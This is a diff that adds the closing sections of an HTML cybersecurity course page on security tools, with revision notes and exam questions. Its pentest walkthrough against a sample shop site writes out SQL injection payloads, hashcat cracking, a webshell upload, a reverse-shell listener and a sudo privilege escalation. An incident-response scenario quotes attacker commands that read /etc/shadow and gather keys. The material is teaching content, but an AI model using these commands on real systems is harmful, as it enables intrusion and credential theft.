+          <tr><td>Wireshark</td><td>Packet Analysis</td><td>Free</td><td>Beginner</td><td>D</td><td>Traffic capture, forensics, protocol analysis, credential hunting</td></tr>
+          <tr><td>Splunk</td><td>SIEM</td><td>Free/Paid</td><td>Intermediate</td><td>D</td><td>Log correlation, threat detection, compliance, incident investigation</td></tr>
+          <tr><td>ELK Stack</td><td>SIEM/Analytics</td><td>Free</td><td>Intermediate</td><td>D</td><td>Open source SIEM, log analysis, custom dashboards</td></tr>
+          <tr><td>Nessus</td><td>Vuln Scanner</td><td>Free(16)/Paid</td><td>Beginner</td><td>D/O</td><td>Automated vulnerability scanning, compliance checking</td></tr>
+          <tr><td>Hashcat</td><td>Password</td><td>Free</td><td>Beginner</td><td>O</td><td>GPU-accelerated hash cracking, WPA2 cracking</td></tr>
+          <tr><td>Hydra</td><td>Brute Force</td><td>Free</td><td>Beginner</td><td>O</td><td>Online service brute force (SSH, FTP, HTTP, RDP)</td></tr>
+          <tr><td>Aircrack-ng</td><td>Wireless</td><td>Free</td><td>Intermediate</td><td>O</td><td>WiFi handshake capture, WPA2 cracking, network auditing</td></tr>
+          <tr><td>Wazuh</td><td>HIDS/EDR</td><td>Free</td><td>Intermediate</td><td>D</td><td>Host intrusion detection, file integrity, log analysis, compliance</td></tr>
+          <tr><td>Nuclei</td><td>Web Scanner</td><td>Free</td><td>Beginner</td><td>O</td><td>Fast CVE scanning with community templates, bug bounty</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Tool Mastery Rating</h3>
+      <div class="tool-cmp">
+        <div class="tc"><div class="tc-name">nmap</div><div class="tc-type">NETWORK SCANNING</div><div class="tc-body">Essential for every pen test. Master scan types, NSE scripts, output formats.</div><div class="tc-score"><div class="tc-bar"><div class="tc-fill" style="width:95%"></div></div><span style="font-size:.7rem;color:var(--cyan)">95% essential</span></div></div>
+        <div class="tc"><div class="tc-name">Burp Suite</div><div class="tc-type">WEB APP TESTING</div><div class="tc-body">Mandatory for web security. Proxy, Repeater, Intruder workflow mastery.</div><div class="tc-score"><div class="tc-bar"><div class="tc-fill" style="width:92%"></div></div><span style="font-size:.7rem;color:var(--cyan)">92% essential</span></div></div>
+        <div class="tc"><div class="tc-name">Splunk SPL</div><div class="tc-type">SIEM ANALYTICS</div><div class="tc-body">Highest-value defensive skill. SPL query writing is core SOC analyst skill.</div><div class="tc-score"><div class="tc-bar"><div class="tc-fill" style="width:90%"></div></div><span style="font-size:.7rem;color:var(--cyan)">90% essential</span></div></div>
+        <div class="tc"><div class="tc-name">Wireshark</div><div class="tc-type">PACKET ANALYSIS</div><div class="tc-body">Display filters + follow stream + extract objects is the core workflow.</div><div class="tc-score"><div class="tc-bar"><div class="tc-fill" style="width:88%"></div></div><span style="font-size:.7rem;color:var(--cyan)">88% essential</span></div></div>
+        <div class="tc"><div class="tc-name">Metasploit</div><div class="tc-type">EXPLOITATION</div><div class="tc-body">Framework mastery: modules, Meterpreter, post-exploitation modules.</div><div class="tc-score"><div class="tc-bar"><div class="tc-fill" style="width:85%"></div></div><span style="font-size:.7rem;color:var(--cyan)">85% essential</span></div></div>
+        <div class="tc"><div class="tc-name">Hashcat</div><div class="tc-type">PASSWORD CRACKING</div><div class="tc-body">Hash modes, attack types, rules. Essential for pen testing and forensics.</div><div class="tc-score"><div class="tc-bar"><div class="tc-fill" style="width:82%"></div></div><span style="font-size:.7rem;color:var(--cyan)">82% essential</span></div></div>
+      </div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Master depth over breadth — it's better to be expert in nmap, Burp, Wireshark, Metasploit, Hashcat, and Splunk than to superficially know 30 tools. These six tools cover 90% of real-world penetration testing and SOC analysis scenarios. Everything else builds on this foundation.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T163 ===== -->
+<div class="sec" id="t163">
+  <div class="sh"><span class="sn">Topic 163</span><h2>Real-world Tool Usage Scenarios</h2><span class="se">🌍</span></div>
+  <div class="sb">
+    <div class="oneliner"><div class="ol-lbl">⚡ Summary</div>Real security work combines multiple tools in workflows — a SOC analyst uses Splunk to detect an alert, Wireshark to investigate traffic, and EDR to isolate a host; a pen tester chains nmap → searchsploit → Metasploit → Mimikatz.</div>
+    <div class="sub"><h3>Scenario 1: Incident Response Workflow (Blue Team)</h3>
+      <div class="terminal">
+        <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">INCIDENT RESPONSE — TOOL WORKFLOW</div></div>
+        <div class="tbody"><pre><span class="cm">SCENARIO: SOC alert "Brute Force + Successful Login from 185.220.101.45"</span>
+<span class="cm">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="cy">STEP 1: Investigate in Splunk</span>
+<span class="cg">index=auth_logs src_ip="185.220.101.45"
+| stats count, values(action) by _time, user
+| sort _time</span>
+<span class="out">2024-01-15 09:14:22  alice  auth_failure (×47)
+2024-01-15 09:14:58  alice  auth_success  ← Brute force succeeded!</span>
+
+<span class="cy">STEP 2: Check what alice did after login</span>
+<span class="cg">index=* user="alice" earliest="09:14:58" latest="+30m"
+| table _time, event_type, dest_ip, command</span>
+<span class="out">09:15:12  process_exec  whoami, id, uname -a
+09:15:45  file_access   /etc/passwd /etc/shadow
+09:16:20  network_conn  185.220.101.45:4444 (REVERSE SHELL!)</span>
+
+<span class="cy">STEP 3: Capture ongoing traffic with tcpdump</span>
+<span class="p">root@server:~#</span> <span class="cmd">tcpdump -i eth0 host 185.220.101.45 -w incident.pcap</span>
+
+<span class="cy">STEP 4: Analyse in Wireshark</span>
+<span class="cm"># Filter: ip.addr == 185.220.101.45</span>
+<span class="cm"># Follow → TCP Stream → see reverse shell commands being executed</span>
+<span class="out">bash-5.1# cat /etc/shadow
+bash-5.1# find / -name "*.pem" 2>/dev/null
+bash-5.1# tar czf /tmp/data.tar.gz /home/alice/documents</span>
+
+<span class="cy">STEP 5: Contain via EDR (CrowdStrike/Wazuh)</span>
+<span class="cm"># Isolate host from network (keep management connection)</span>
+<span class="cm"># Run memory analysis with Volatility</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">python3 vol.py -f memory.dmp linux.pslist</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">python3 vol.py -f memory.dmp linux.netstat</span>    <span class="cm"># Network connections in memory</span>
+
+<span class="cy">STEP 6: Block attacker IP on firewall</span>
+<span class="p">root@firewall:~#</span> <span class="cmd">iptables -I INPUT -s 185.220.101.45 -j DROP</span>
+<span class="cm"># Also check if IP in VirusTotal: curl https://www.virustotal.com/api/...</span></pre></div>
+    </div>
+    <div class="sub"><h3>Scenario 2: Penetration Test Workflow (Red Team)</h3>
+      <div class="terminal">
+        <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">PENTEST — TOOL CHAIN WORKFLOW</div></div>
+        <div class="tbody"><pre><span class="cm">SCENARIO: External web application pentest — acme-shop.com</span>
+
+<span class="cy">Phase 1: Recon</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">subfinder -d acme-shop.com | httpx -status-code</span>   <span class="cm"># Live subdomains</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">gau acme-shop.com | grep "?.*=" | qsreplace "'"</span>   <span class="cm"># Historical URLs with params</span>
+
+<span class="cy">Phase 2: Scanning</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap -sV -sC -p- --min-rate 5000 acme-shop.com</span>   <span class="cm"># Port scan</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nuclei -u https://acme-shop.com -severity critical,high</span>
+
+<span class="cy">Phase 3: Web App Testing (Burp Suite)</span>
+<span class="cm"># Burp Proxy → browse application → sitemap builds</span>
+<span class="cm"># Burp Intruder → fuzz every parameter with XSS payloads</span>
+<span class="cm"># Burp Repeater → test SQLi on product?id=1</span>
+<span class="err">product?id=1' ORDER BY 3--   → Error! (2 columns exist)</span>
+<span class="err">product?id=-1 UNION SELECT username,password FROM users--</span>
+<span class="out">admin:$2y$10$bcryptHASH...</span>
+
+<span class="cy">Phase 4: Hash Cracking</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">hashcat -m 3200 admin_hash.txt rockyou.txt -r best64.rule</span>
+<span class="out">$2y$10$...: Admin2024!  ← bcrypt cracked!</span>
+
+<span class="cy">Phase 5: Post-Exploitation (logged in as admin)</span>
+<span class="cm"># Upload PHP webshell via admin file manager</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nc -lvnp 4444</span>                                    <span class="cm"># Listen for reverse shell</span>
+<span class="cm"># shell.php → visit URL → reverse shell received</span>
+<span class="p">www-data@acme-shop:$</span> <span class="cmd">sudo -l</span>
+<span class="out">(root) NOPASSWD: /usr/bin/python3  ← PrivEsc!</span>
+<span class="p">www-data@acme-shop:$</span> <span class="cmd">sudo python3 -c 'import os;os.system("/bin/bash")'</span>
+<span class="out">root@acme-shop:#</span>
+
+<span class="cy">Phase 6: Report (Dradis)</span>
+<span class="cm"># All findings documented with screenshots, CVSS scores, remediation</span></pre></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Real-world security work is a series of tool-supported decisions, not just tool execution. The analyst decides WHAT to look for; the tool finds it. The pen tester decides WHICH vulnerability to pursue; the tool demonstrates the impact. Always document findings in real-time — you never remember every detail at report-writing time.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T164 REVISION ===== -->
+<div class="sgt">📝 Revision</div>
+<div class="sec" id="t164">
+  <div class="sh"><span class="sn">Topic 164</span><h2>Unit 9 Revision Notes</h2><span class="se">📝</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Tool Quick Reference Glossary</h3>
+      <div class="rv">
+        <div class="ri"><span class="rt">Kali Linux</span><span class="rd">Debian pen testing OS. 600+ tools. Free. Standard for ethical hackers. WSL2, Docker, VM options.</span></div>
+        <div class="ri"><span class="rt">nmap</span><span class="rd">Network scanner. -sV=version, -sC=scripts, -A=aggressive, -p-=all ports, -sS=SYN stealth.</span></div>
+        <div class="ri"><span class="rt">Wireshark</span><span class="rd">GUI packet analyser. Decodes 2000+ protocols. Display filters + follow stream + export objects.</span></div>
+        <div class="ri"><span class="rt">tshark</span><span class="rd">CLI Wireshark. tcpdump alternative with display filter power. -r read pcap, -w write pcap.</span></div>
+        <div class="ri"><span class="rt">Metasploit</span><span class="rd">Exploitation framework. msfconsole. exploit/, auxiliary/, post/, payload/ modules. Meterpreter shell.</span></div>
+        <div class="ri"><span class="rt">msfvenom</span><span class="rd">Payload generator from Metasploit. -p payload, LHOST, LPORT, -f format, -o output.</span></div>
+        <div class="ri"><span class="rt">Burp Suite</span><span class="rd">Web app proxy. Proxy, Repeater, Intruder, Decoder, Scanner. Essential for web pen testing.</span></div>
+        <div class="ri"><span class="rt">SIEM</span><span class="rd">Security Information and Event Management. Centralise logs → correlate → alert → investigate.</span></div>
+        <div class="ri"><span class="rt">Splunk SPL</span><span class="rd">Search Processing Language. stats, eval, where, table, sort, timechart. Pipe-based like Unix.</span></div>
+        <div class="ri"><span class="rt">ELK Stack</span><span class="rd">Elasticsearch + Logstash + Kibana. Open source SIEM. KQL for searching. Beats for log shipping.</span></div>
+        <div class="ri"><span class="rt">Nessus</span><span class="rd">Vulnerability scanner. Authenticated + unauthenticated. CVSS scoring. 16 IPs free (Essentials).</span></div>
+        <div class="ri"><span class="rt">Nuclei</span><span class="rd">Template-based scanner. Community templates for CVEs, misconfigs. Fast. Free. Bug bounty essential.</span></div>
+        <div class="ri"><span class="rt">Hashcat</span><span class="rd">GPU password cracker. -m=hash type, -a=attack mode, -0=dict, -3=brute. Best64.rule for mutations.</span></div>
+        <div class="ri"><span class="rt">John the Ripper</span><span class="rd">CPU password cracker. Auto-detects hash. zip2john, ssh2john, pdf2john helpers.</span></div>
+        <div class="ri"><span class="rt">Hydra</span><span class="rd">Online brute force. 50+ protocols. -l=user, -L=userlist, -P=passlist. SSH, FTP, RDP, HTTP.</span></div>
+        <div class="ri"><span class="rt">Wazuh</span><span class="rd">Free HIDS + SIEM. File integrity, log analysis, CVE detection. OSSEC fork. Kibana UI.</span></div>
+        <div class="ri"><span class="rt">Zeek (Bro)</span><span class="rd">Network analysis framework. conn.log, dns.log, http.log. Scriptable. C2 detection.</span></div>
+        <div class="ri"><span class="rt">SOAR</span><span class="rd">Security Orchestration, Automation and Response. Automates incident response workflows.</span></div>
+        <div class="ri"><span class="rt">Ansible</span><span class="rd">Agentless automation. Playbooks in YAML. Deploy security hardening to 100s of servers.</span></div>
+        <div class="ri"><span class="rt">Checkov</span><span class="rd">IaC security scanner. Finds misconfigs in Terraform, CloudFormation, Kubernetes YAML.</span></div>
+      </div>
+    </div>
+    <div class="div"></div>
+    <div class="sub"><h3>Task → Tool Quick Reference</h3>
+      <div class="cb"><div class="clbl">TOOL SELECTION REFERENCE</div><pre><span class="cy">TASK                                    PRIMARY TOOL         ALTERNATIVE</span>
+──────────────────────────────────────────────────────────────────────────
+<span class="cg">Port scan a host</span>                        nmap                 masscan, rustscan
+<span class="cg">Web directory brute force</span>               gobuster             ffuf, dirbuster
+<span class="cg">Web vulnerability testing</span>               Burp Suite           OWASP ZAP
+<span class="cg">SQL injection exploitation</span>              sqlmap               Burp Suite
+<span class="cg">Capture network traffic</span>                 Wireshark            tcpdump, tshark
+<span class="cg">Exploit a CVE</span>                           Metasploit           searchsploit + manual
+<span class="cg">Generate payload/shell</span>                  msfvenom             revshells.com
+<span class="cg">Crack password hash (offline)</span>           hashcat (GPU)        John the Ripper (CPU)
+<span class="cg">Online brute force</span>                      Hydra                Medusa, Crackmapexec
+<span class="cg">Vulnerability scanning (enterprise)</span>    Nessus               Qualys, OpenVAS
+<span class="cg">Fast web CVE scanning</span>                   Nuclei               nikto
+<span class="cg">Log analysis / SIEM (enterprise)</span>       Splunk               Microsoft Sentinel
+<span class="cg">Log analysis / SIEM (free)</span>             ELK Stack            Wazuh, Graylog
+<span class="cg">Host intrusion detection</span>               Wazuh                OSSEC, Tripwire
+<span class="cg">Network flow analysis</span>                   Zeek                 Arkime, ntopng
+<span class="cg">Password spraying (AD)</span>                  Crackmapexec         Kerbrute
+<span class="cg">Active Directory enumeration</span>            BloodHound           ADExplorer, ldapsearch
+<span class="cg">Windows credential dumping</span>              Mimikatz             secretsdump (impacket)
+<span class="cg">Security automation / scripts</span>          Python               Bash, PowerShell
+<span class="cg">Infrastructure hardening at scale</span>      Ansible              Chef, Puppet, Terraform</pre></div>
+    </div>
+    <div class="div"></div>
+    <div class="sub"><h3>📋 Exam Practice Questions</h3>
+      <div class="tw"><table>
+        <thead><tr><th>#</th><th>Question</th><th>Marks</th><th>Key Points</th></tr></thead>
+        <tbody>
+          <tr><td>Q1</td><td>What is Kali Linux? Why is it the standard OS for penetration testing? Name 5 built-in tool categories.</td><td>6</td><td>Debian-based, 600+ tools, maintained, industry standard; recon, web, exploit, wireless, forensics</td></tr>
+          <tr><td>Q2</td><td>Explain three different nmap scan types (-sS, -sV, -sC). When would you use each?</td><td>6</td><td>SYN=stealth recon; sV=service version; sC=default scripts; combine: sV -sC for full service info</td></tr>
+          <tr><td>Q3</td><td>What is Wireshark used for? Write a display filter to show all POST requests containing the word "password".</td><td>5</td><td>Packet capture + analysis; filter: http.request.method=="POST" && http contains "password"</td></tr>
+          <tr><td>Q4</td><td>Describe the Metasploit framework. Explain the difference between an exploit module and an auxiliary module.</td><td>6</td><td>Exploitation framework; exploit=gains access via vulnerability; auxiliary=scanner/brute/no payload</td></tr>
+          <tr><td>Q5</td><td>What is a SIEM? Explain how it detects a brute force attack using log correlation.</td><td>7</td><td>Centralise logs + correlate; rule: >5 auth failures, same IP, 60 seconds → alert</td></tr>
+          <tr><td>Q6</td><td>Write a Splunk SPL query to find the top 10 source IPs blocked by a firewall in the last 24 hours.</td><td>5</td><td">index=firewall action=blocked earliest=-24h | stats count by src_ip | sort -count | head 10</td></tr>
+          <tr><td>Q7</td><td>Compare ELK Stack and Splunk as SIEM solutions. When would you choose each?</td><td>6</td><td>ELK=free, flexible, DevOps-friendly; Splunk=commercial, powerful SPL, more mature, costly; choose ELK for budget</td></tr>
+          <tr><td>Q8</td><td>What is hashcat? What is the command to crack NTLM hashes using rockyou.txt with best64 rules?</td><td>5</td><td">GPU hash cracker; hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule</td></tr>
+          <tr><td>Q9</td><td>Describe a complete SOC incident response workflow using 4 different security tools.</td><td>8</td><td>Splunk alert → Wireshark traffic analysis → EDR endpoint isolation → iptables/firewall block</td></tr>
+          <tr><td>Q10</td><td>What is SOAR? Describe an automated response playbook for a detected brute force attack.</td><td>6</td><td">Orchestration+Automation+Response; SIEM alert→ VT lookup→ firewall block→ EDR isolate→ create ticket→ notify SOC</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="pills">
+      <span class="pill">🗺️ nmap first, always</span>
+      <span class="pill c">🦈 Wireshark = network truth</span>
+      <span class="pill l">💀 Metasploit = exploiter's toolkit</span>
+      <span class="pill o">🔬 Burp = web app essential</span>
+      <span class="pill">📊 Splunk SPL = SOC power</span>
+      <span class="pill c">🐘 ELK = free SIEM alternative</span>
+      <span class="pill l">🔓 hashcat -m 0 = 100B MD5/sec</span>
+      <span class="pill r">⚠️ Tools without auth = crime</span>
+    </div>
+    <div class="concl"><div class="cl">📌 Unit 9 Final Takeaway</div>
+      <p>Tools are only as powerful as the person wielding them. The best security professionals don't just know which tools to run — they understand what each tool reveals, how to interpret the output, and what action to take next. <strong>Practice daily: run nmap on your home network, set up Splunk on a free trial, solve HackTheBox challenges with Burp and Metasploit, and build Python scripts to automate what you do manually. Mastery comes from repetition in real environments, not just reading about it.</strong></p>
+    </div>
+  </div>
+</div>
+
+<div style="text-align:center;padding:40px 0 60px;opacity:.22;font-family:'JetBrains Mono',monospace;font-size:.7rem;color:#0a2a3a;letter-spacing:2px;">
+  UNIT 9 // CYBERSECURITY TOOLS // TOPICS 149–164 // COMPLETE MASTERY GUIDE
+</div>
+</div>
+
+<script>
+const cv = document.getElementById('bg');
+const cx = cv.getContext('2d');
+cv.width = window.innerWidth;
+cv.height = window.innerHeight;
+
+// Tech circuit board animation
+const nodes = [];
+for(let i=0;i<55;i++){
+  nodes.push({
+    x:Math.random()*cv.width, y:Math.random()*cv.height,
+    vx:(Math.random()-.5)*.4, vy:(Math.random()-.5)*.4,
+    r:Math.random()*2+0.5, alpha:Math.random()*.2+0.04,
+    color: Math.random()>.6 ? '#4a9eff' : Math.random()>.5 ? '#00f5d4' : '#b2ff59'
+  });
+}
+
+function draw(){
+  cx.clearRect(0,0,cv.width,cv.height);
+  for(let i=0;i<nodes.length;i++){
+    const n=nodes[i];
+    n.x+=n.vx; n.y+=n.vy;
+    if(n.x<0||n.x>cv.width)n.vx*=-1;
+    if(n.y<0||n.y>cv.height)n.vy*=-1;
+    cx.beginPath();cx.arc(n.x,n.y,n.r,0,Math.PI*2);
+    cx.fillStyle=n.color;cx.globalAlpha=n.alpha;cx.fill();
+    for(let j=i+1;j<nodes.length;j++){
+      const m=nodes[j];
+      const dx=n.x-m.x,dy=n.y-m.y,d=Math.sqrt(dx*dx+dy*dy);
+      if(d<110){
+        cx.beginPath();cx.moveTo(n.x,n.y);cx.lineTo(m.x,m.y);
+        cx.strokeStyle='#4a9eff';cx.globalAlpha=(1-d/110)*.08;cx.lineWidth=.6;cx.stroke();
+      }
+    }
+  }
+  cx.globalAlpha=1;
+  requestAnimationFrame(draw);
+}
+draw();
+
+window.addEventListener('resize',()=>{cv.width=window.innerWidth;cv.height=window.innerHeight;});
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',e=>{e.preventDefault();
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t)t.scrollIntoView({behavior:'smooth',block:'start'});
+  });
+});
+</script>
+</body>
+</html>
